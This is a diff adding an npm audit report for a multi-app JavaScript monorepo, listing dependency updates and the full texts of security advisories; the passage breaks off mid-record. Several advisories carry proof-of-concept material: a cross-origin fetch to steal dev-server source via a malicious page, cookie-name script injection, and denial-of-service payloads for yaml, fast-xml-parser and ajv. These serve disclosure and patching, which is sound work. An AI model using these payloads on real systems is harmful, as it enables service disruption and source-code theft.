@@ -1,0 +1,1901 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1113714,
+          "path": "apps__moneytrash>eslint>ajv",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "ajv",
+      "target": "6.15.0",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115555,
+          "path": "apps__gallery>jest>@jest/core>jest-config>jest-circus>dedent>babel-plugin-macros>cosmiconfig>yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "yaml",
+      "target": "1.10.3",
+      "depth": 9
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116307,
+          "path": "apps__moneytrash>@aws-sdk/client-s3>@aws-sdk/core>@aws-sdk/xml-builder>fast-xml-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1117911,
+          "path": "apps__moneytrash>@aws-sdk/client-s3>@aws-sdk/core>@aws-sdk/xml-builder>fast-xml-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@aws-sdk/core",
+      "target": "3.977.6",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1119438,
+          "path": "apps__gallery>jest-environment-jsdom>jsdom>http-proxy-agent>@tootallnate/once",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@tootallnate/once",
+      "target": "2.0.1",
+      "depth": 5
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1119441,
+          "path": "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/config-plugins>xcode>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1119502,
+          "path": "apps__gallery>formidable>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "qs",
+      "target": "6.15.3",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1123528,
+          "path": "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>@expo/require-utils>@babel/core",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@babel/core",
+      "target": "7.29.7",
+      "depth": 7
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1123965,
+          "path": "apps__docs>@docusaurus/core>webpack-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123966,
+          "path": "apps__docs>@docusaurus/core>webpack-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "webpack-dev-server",
+      "target": "5.2.6",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1130716,
+          "path": "apps__installer>electron-builder>app-builder-lib>@electron/rebuild>node-gyp>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130727,
+          "path": "apps__installer>electron-builder>app-builder-lib>@electron/rebuild>node-gyp>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130732,
+          "path": "apps__installer>electron-builder>app-builder-lib>@electron/rebuild>node-gyp>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "undici",
+      "target": "6.28.0",
+      "depth": 6
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1138115,
+          "path": "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>@expo/xcpretty>js-yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "js-yaml",
+      "target": "4.3.1",
+      "depth": 7
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1138811,
+          "path": "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>expo-router>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1138813,
+          "path": "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>expo-router>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "nanoid",
+      "target": "3.3.18",
+      "depth": 7
+    },
+    {
+      "action": "review",
+      "module": "zod",
+      "resolves": [
+        {
+          "id": 1099462,
+          "path": "apps__master>@imgly/background-removal-node>zod",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "apps__cloud-backend>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1102341,
+          "path": "apps__website>@cloudflare/next-on-pages>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1120680,
+          "path": "apps__license-generator>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cookie",
+      "resolves": [
+        {
+          "id": 1103907,
+          "path": "apps__website>@cloudflare/next-on-pages>cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "serialize-javascript",
+      "resolves": [
+        {
+          "id": 1119440,
+          "path": "apps__docs>@docusaurus/core>@docusaurus/bundler>copy-webpack-plugin>serialize-javascript",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "uuid",
+      "resolves": [
+        {
+          "id": 1119441,
+          "path": "apps__docs>@docusaurus/core>webpack-dev-server>sockjs>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1119441,
+          "path": "apps__master>node-mac-notifier>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1119441,
+          "path": "apps__master>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1119441,
+          "path": "apps__moneytrash>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1119441,
+          "path": "packages__ui>@storybook/addon-essentials>@storybook/addon-actions>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "joi",
+      "resolves": [
+        {
+          "id": 1120656,
+          "path": "apps__master>passkit-generator>joi",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "body-parser",
+      "resolves": [
+        {
+          "id": 1123976,
+          "path": "apps__touch>body-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123977,
+          "path": "apps__docs>@docusaurus/core>webpack-dev-server>express>body-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@hono/node-server",
+      "resolves": [
+        {
+          "id": 1124006,
+          "path": "apps__mcp-server>@modelcontextprotocol/sdk>@hono/node-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "dompurify",
+      "resolves": [
+        {
+          "id": 1124022,
+          "path": "apps__website>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1138538,
+          "path": "apps__website>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "react-router",
+      "resolves": [
+        {
+          "id": 1124268,
+          "path": "apps__management>react-router-dom>react-router",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1124272,
+          "path": "apps__management>react-router-dom>react-router",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1136303,
+          "path": "apps__management>react-router-dom>react-router",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "react-router-dom",
+      "resolves": [
+        {
+          "id": 1124270,
+          "path": "apps__management>react-router-dom",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@remix-run/router",
+      "resolves": [
+        {
+          "id": 1136293,
+          "path": "apps__management>react-router-dom>@remix-run/router",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "js-yaml",
+      "resolves": [
+        {
+          "id": 1138114,
+          "path": "apps__docs>@docusaurus/core>@docusaurus/utils>gray-matter>js-yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "image-size",
+      "resolves": [
+        {
+          "id": 1138808,
+          "path": "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>expo-router>@expo/ui>react-native-worklets>@react-native/metro-config>metro-config>metro>image-size",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        },
+        {
+          "id": 1138808,
+          "path": "apps__docs>@docusaurus/core>@docusaurus/mdx-loader>image-size",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        },
+        {
+          "id": 1138809,
+          "path": "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>expo-router>@expo/ui>react-native-worklets>@react-native/metro-config>metro-config>metro>image-size",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        },
+        {
+          "id": 1138809,
+          "path": "apps__docs>@docusaurus/core>@docusaurus/mdx-loader>image-size",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1099462": {
+      "findings": [
+        {
+          "version": "3.21.4",
+          "paths": [
+            "apps__master>@imgly/background-removal-node>zod"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-4316\n- https://www.npmjs.com/package/zod\n- https://github.com/colinhacks/zod/issues/2609\n- https://github.com/colinhacks/zod/pull/2824\n- https://github.com/colinhacks/zod/commit/2ba00fe2377f4d53947a84b8cdb314a63bbd6dd4\n- https://github.com/colinhacks/zod/releases/tag/v3.22.3\n- https://fluidattacks.com/advisories/swift\n- https://github.com/advisories/GHSA-m95q-7qp3-xv42",
+      "created": "2023-09-28T21:30:58.000Z",
+      "id": 1099462,
+      "npm_advisory_id": null,
+      "overview": "Zod version 3.22.2 allows an attacker to perform a denial of service while validating emails.",
+      "reported_by": null,
+      "title": "Zod denial of service vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-4316"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "zod",
+      "vulnerable_versions": "<=3.22.2",
+      "github_advisory_id": "GHSA-m95q-7qp3-xv42",
+      "recommendation": "Upgrade to version 3.22.3 or later",
+      "patched_versions": ">=3.22.3",
+      "updated": "2024-09-06T19:11:38.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-m95q-7qp3-xv42"
+    },
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": [
+            "apps__cloud-backend>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild"
+          ]
+        },
+        {
+          "version": "0.15.18",
+          "paths": [
+            "apps__website>@cloudflare/next-on-pages>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1103907": {
+      "findings": [
+        {
+          "version": "0.5.0",
+          "paths": [
+            "apps__website>@cloudflare/next-on-pages>cookie"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\n- https://github.com/jshttp/cookie/pull/167\n- https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\n- https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "created": "2024-10-04T20:31:00.000Z",
+      "id": 1103907,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "reported_by": null,
+      "title": "cookie accepts cookie name, path, and domain with out of bounds characters",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47764"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "cookie",
+      "vulnerable_versions": "<0.7.0",
+      "github_advisory_id": "GHSA-pxg6-pf52-xh8x",
+      "recommendation": "Upgrade to version 0.7.0 or later",
+      "patched_versions": ">=0.7.0",
+      "updated": "2025-04-15T13:56:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+    },
+    "1113714": {
+      "findings": [
+        {
+          "version": "6.12.6",
+          "paths": [
+            "apps__moneytrash>eslint>ajv"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-69873\n- https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md\n- https://github.com/ajv-validator/ajv/pull/2586\n- https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5\n- https://github.com/ajv-validator/ajv/releases/tag/v8.18.0\n- https://github.com/ajv-validator/ajv/pull/2588\n- https://github.com/ajv-validator/ajv/releases/tag/v6.14.0\n- https://github.com/advisories/GHSA-2g4f-4pwh-qvx6\n- https://github.com/ajv-validator/ajv/pull/2590\n- https://github.com/github/advisory-database/pull/6991",
+      "created": "2026-02-11T21:30:39.000Z",
+      "id": 1113714,
+      "npm_advisory_id": null,
+      "overview": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "reported_by": null,
+      "title": "ajv has ReDoS when using `$data` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-69873"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ajv",
+      "vulnerable_versions": "<6.14.0",
+      "github_advisory_id": "GHSA-2g4f-4pwh-qvx6",
+      "recommendation": "Upgrade to version 6.14.0 or later",
+      "patched_versions": ">=6.14.0",
+      "updated": "2026-03-02T21:58:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+    },
+    "1115555": {
+      "findings": [
+        {
+          "version": "1.10.2",
+          "paths": [
+            "apps__gallery>jest>@jest/core>jest-config>jest-circus>dedent>babel-plugin-macros>cosmiconfig>yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/eemeli/yaml/security/advisories/GHSA-48c2-rrv3-qjmp\n- https://github.com/eemeli/yaml/commit/1e84ebbea7ec35011a4c61bbb820a529ee4f359b\n- https://github.com/eemeli/yaml/releases/tag/v1.10.3\n- https://github.com/eemeli/yaml/releases/tag/v2.8.3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33532\n- https://github.com/advisories/GHSA-48c2-rrv3-qjmp",
+      "created": "2026-03-25T20:08:24.000Z",
+      "id": 1115555,
+      "npm_advisory_id": null,
+      "overview": "Parsing a YAML document with `yaml` may throw a RangeError due to a stack overflow.\n\nThe node resolution/composition phase uses recursive function calls without a depth bound. An attacker who can supply YAML for parsing can trigger a `RangeError: Maximum call stack size exceeded` with a small payload (~2ΓÇô10 KB). The `RangeError` is not a `YAMLParseError`, so applications that only catch YAML-specific errors will encounter an unexpected exception type. Depending on the host application's exception handling, this can fail requests or terminate the Node.js process.\n\nFlow sequences allow deep nesting with minimal bytes (2 bytes per level: one `[` and one `]`). On the default Node.js stack, approximately 1,000ΓÇô5,000 levels of nesting (2ΓÇô10 KB input) exhaust the call stack. The exact threshold is environment-dependent (Node.js version, stack size, call stack depth at invocation).\n\nNote: the library's `Parser` (CST phase) uses a stack-based iterative approach and is not affected. Only the compose/resolve phase uses actual call-stack recursion.\n\nAll three public parsing APIs are affected: `YAML.parse()`, `YAML.parseDocument()`, and `YAML.parseAllDocuments()`.\n\n### PoC\n\n```javascript\nconst YAML = require('yaml');\n\n// ~10 KB payload: 5000 levels of nested flow sequences\nconst payload = '['.repeat(5000) + '1' + ']'.repeat(5000);\n\ntry {\n  YAML.parse(payload);\n} catch (e) {\n  console.log(e.constructor.name); // RangeError (NOT YAMLParseError)\n  console.log(e.message);          // Maximum call stack size exceeded\n}\n```\n\nTest environment: Node.js v24.12.0, macOS darwin arm64\n\n| Version | Nesting Depth | Input Size | Result |\n|---|---|---|---|\n| 1.0.0 | 5,000 | 10,001 B | RangeError |\n| 1.10.2 | 5,000 | 10,001 B | RangeError |\n| 2.0.0 | 5,000 | 10,001 B | RangeError |\n| 2.8.2 | 5,000 | 10,001 B | RangeError |\n| 2.8.3 | 5,000 | 10,001 B | YAMLParseError |\n\nDepth threshold on yaml 2.8.2:\n\n| Nesting Depth | Input Size | Result |\n|---|---|---|\n| 500 | 1,001 B | Parses successfully |\n| 1,000 | 2,001 B | RangeError (threshold varies by stack size) |\n| 5,000 | 10,001 B | RangeError |",
+      "reported_by": null,
+      "title": "yaml is vulnerable to Stack Overflow via deeply nested YAML collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33532"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "yaml",
+      "vulnerable_versions": ">=1.0.0 <1.10.3",
+      "github_advisory_id": "GHSA-48c2-rrv3-qjmp",
+      "recommendation": "Upgrade to version 1.10.3 or later",
+      "patched_versions": ">=1.10.3",
+      "updated": "2026-03-27T21:34:54.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-48c2-rrv3-qjmp"
+    },
+    "1116307": {
+      "findings": [
+        {
+          "version": "5.5.6",
+          "paths": [
+            "apps__moneytrash>@aws-sdk/client-s3>@aws-sdk/core>@aws-sdk/xml-builder>fast-xml-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-jp2q-39xq-3w4g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33349\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/239b64aa1fc5c5455ddebbbb54a187eb68c9fdb7\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/88d0936a23dabe51bfbf42255e2ce912dfee2221\n- https://github.com/advisories/GHSA-jp2q-39xq-3w4g",
+      "created": "2026-03-19T19:13:13.000Z",
+      "id": 1116307,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe `DocTypeReader` in fast-xml-parser uses JavaScript truthy checks to evaluate `maxEntityCount` and `maxEntitySize` configuration limits. When a developer explicitly sets either limit to `0` ΓÇö intending to disallow all entities or restrict entity size to zero bytes ΓÇö the falsy nature of `0` in JavaScript causes the guard conditions to short-circuit, completely bypassing the limits. An attacker who can supply XML input to such an application can trigger unbounded entity expansion, leading to memory exhaustion and denial of service.\n\n## Details\n\nThe `OptionsBuilder.js` correctly preserves a user-supplied value of `0` using nullish coalescing (`??`):\n\n```js\n// src/xmlparser/OptionsBuilder.js:111\nmaxEntityCount: value.maxEntityCount ?? 100,\n// src/xmlparser/OptionsBuilder.js:107\nmaxEntitySize: value.maxEntitySize ?? 10000,\n```\n\nHowever, `DocTypeReader.js` uses truthy evaluation to check these limits. Because `0` is falsy in JavaScript, the entire guard expression short-circuits to `false`, and the limit is never enforced:\n\n```js\n// src/xmlparser/DocTypeReader.js:30-32\nif (this.options.enabled !== false &&\n    this.options.maxEntityCount &&          // ΓåÉ 0 is falsy, skips check\n    entityCount >= this.options.maxEntityCount) {\n    throw new Error(`Entity count ...`);\n}\n```\n\n```js\n// src/xmlparser/DocTypeReader.js:128-130\nif (this.options.enabled !== false &&\n    this.options.maxEntitySize &&            // ΓåÉ 0 is falsy, skips check\n    entityValue.length > this.options.maxEntitySize) {\n    throw new Error(`Entity \"${entityName}\" size ...`);\n}\n```\n\nThe execution flow is:\n\n1. Developer configures `processEntities: { maxEntityCount: 0, maxEntitySize: 0 }` intending to block all entity definitions.\n2. `OptionsBuilder.normalizeProcessEntities` preserves the `0` values via `??` (correct behavior).\n3. Attacker supplies XML with a DOCTYPE containing many large entities.\n4. `DocTypeReader.readDocType` evaluates `this.options.maxEntityCount && ...` ΓÇö since `0` is falsy, the entire condition is `false`.\n5. `DocTypeReader.readEntityExp` evaluates `this.options.maxEntitySize && ...` ΓÇö same result.\n6. All entity count and size limits are bypassed; entities are parsed without restriction.\n\n## PoC\n\n```js\nconst { XMLParser } = require(\"fast-xml-parser\");\n\n// Developer intends: \"no entities allowed at all\"\nconst parser = new XMLParser({\n  processEntities: {\n    enabled: true,\n    maxEntityCount: 0,    // should mean \"zero entities allowed\"\n    maxEntitySize: 0       // should mean \"zero-length entities only\"\n  }\n});\n\n// Generate XML with many large entities\nlet entities = \"\";\nfor (let i = 0; i < 1000; i++) {\n  entities += `<!ENTITY e${i} \"${\"A\".repeat(100000)}\">`;\n}\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  ${entities}\n]>\n<foo>&e0;</foo>`;\n\n// This should throw \"Entity count exceeds maximum\" but does not\ntry {\n  const result = parser.parse(xml);\n  console.log(\"VULNERABLE: parsed without error, entities bypassed limits\");\n} catch (e) {\n  console.log(\"SAFE:\", e.message);\n}\n\n// Control test: setting maxEntityCount to 1 correctly blocks\nconst safeParser = new XMLParser({\n  processEntities: {\n    enabled: true,\n    maxEntityCount: 1,\n    maxEntitySize: 100\n  }\n});\n\ntry {\n  safeParser.parse(xml);\n  console.log(\"ERROR: should have thrown\");\n} catch (e) {\n  console.log(\"CONTROL:\", e.message);  // \"Entity count (2) exceeds maximum allowed (1)\"\n}\n```\n\n**Expected output:**\n```\nVULNERABLE: parsed without error, entities bypassed limits\nCONTROL: Entity count (2) exceeds maximum allowed (1)\n```\n\n## Impact\n\n- **Denial of Service:** An attacker supplying crafted XML with thousands of large entity definitions can exhaust server memory in applications where the developer configured `maxEntityCount: 0` or `maxEntitySize: 0`, intending to prohibit entities entirely.\n- **Security control bypass:** Developers who explicitly set restrictive limits to `0` receive no protection ΓÇö the opposite of their intent. This creates a false sense of security.\n- **Scope:** Only applications that explicitly set these limits to `0` are affected. The default configuration (`maxEntityCount: 100`, `maxEntitySize: 10000`) is not vulnerable. The `enabled: false` option correctly disables entity processing entirely and is not affected.\n\n## Recommended Fix\n\nReplace the truthy checks in `DocTypeReader.js` with explicit type checks that correctly treat `0` as a valid numeric limit:\n\n```js\n// src/xmlparser/DocTypeReader.js:30-32 ΓÇö replace:\nif (this.options.enabled !== false &&\n    this.options.maxEntityCount &&\n    entityCount >= this.options.maxEntityCount) {\n\n// with:\nif (this.options.enabled !== false &&\n    typeof this.options.maxEntityCount === 'number' &&\n    entityCount >= this.options.maxEntityCount) {\n```\n\n```js\n// src/xmlparser/DocTypeReader.js:128-130 ΓÇö replace:\nif (this.options.enabled !== false &&\n    this.options.maxEntitySize &&\n    entityValue.length > this.options.maxEntitySize) {\n\n// with:\nif (this.options.enabled !== false &&\n    typeof this.options.maxEntitySize === 'number' &&\n    entityValue.length > this.options.maxEntitySize) {\n```\n\n# Workaround\n\nIf you don't want to processed the entities, keep the processEntities flag to false instead of setting any limit to 0.",
+      "reported_by": null,
+      "title": "Entity Expansion Limits Bypassed When Set to Zero Due to JavaScript Falsy Evaluation in fast-xml-parser",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33349"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-xml-parser",
+      "vulnerable_versions": ">=5.0.0 <5.5.7",
+      "github_advisory_id": "GHSA-jp2q-39xq-3w4g",
+      "recommendation": "Upgrade to version 5.5.7 or later",
+      "patched_versions": ">=5.5.7",
+      "updated": "2026-04-08T22:27:45.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-jp2q-39xq-3w4g"
+    },
+    "1117911": {
+      "findings": [
+        {
+          "version": "5.5.6",
+          "paths": [
+            "apps__moneytrash>@aws-sdk/client-s3>@aws-sdk/core>@aws-sdk/xml-builder>fast-xml-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41650\n- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.6.0\n- https://github.com/advisories/GHSA-gh4j-gqv2-49f6",
+      "created": "2026-04-22T20:04:17.000Z",
+      "id": 1117911,
+      "npm_advisory_id": null,
